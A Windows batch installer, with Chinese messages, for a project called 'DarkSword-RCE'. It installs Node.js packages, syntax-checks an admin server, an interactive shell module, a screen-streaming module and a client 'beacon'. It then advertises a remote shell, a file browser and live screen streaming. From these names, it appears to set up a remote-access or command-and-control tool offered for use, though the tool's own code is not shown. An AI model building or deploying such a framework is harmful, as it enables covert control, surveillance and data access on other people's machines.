@echo off
REM final_install.bat — Windows 安装脚本

echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo   DarkSword-RCE 完整功能安装
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo.

where node >nul 2>&1
if %errorlevel% neq 0 (
    echo ❌ 未安装 Node.js
    exit /b 1
)

for /f "tokens=*" %%i in ('node -v') do set NODE_VERSION=%%i
echo ✓ Node.js: %NODE_VERSION%
echo.

echo [1/4] 安装新依赖...
call npm install ws@8.16.0 node-pty@1.0.0 sharp@0.33.2
if %errorlevel% neq 0 (
    echo ❌ 依赖安装失败
    exit /b 1
)

echo.
echo [2/4] 验证依赖...
node -e "try{require('ws');require('node-pty');require('sharp');console.log('✓ 所有依赖已安装');}catch(e){console.error('❌ 依赖验证失败:',e.message);process.exit(1);}"

echo.
echo [3/4] 验证服务端代码...
node --check "server\admin_server.js" && echo ✓ admin_server.js 语法正确
node --check "server\interactive_shell.js" && echo ✓ interactive_shell.js 语法正确
node --check "server\screen_stream.js" && echo ✓ screen_stream.js 语法正确

echo.
echo [4/4] 验证客户端代码...
node --check "client\beacon_complete_integration.js" && echo ✓ beacon_complete_integration.js 语法正确

echo.
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ✅ 安装完成！
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo.
echo 已集成功能：
echo   ✓ 交互式 Shell (WebSocket + pty)
echo   ✓ 文件浏览器 API
echo   ✓ 实时屏幕流 (差分推流)
echo.
echo 下一步：
echo   1. 启动服务器: npm start
echo   2. 查看文档: type COMPLETE_IMPLEMENTATION_GUIDE.md
echo.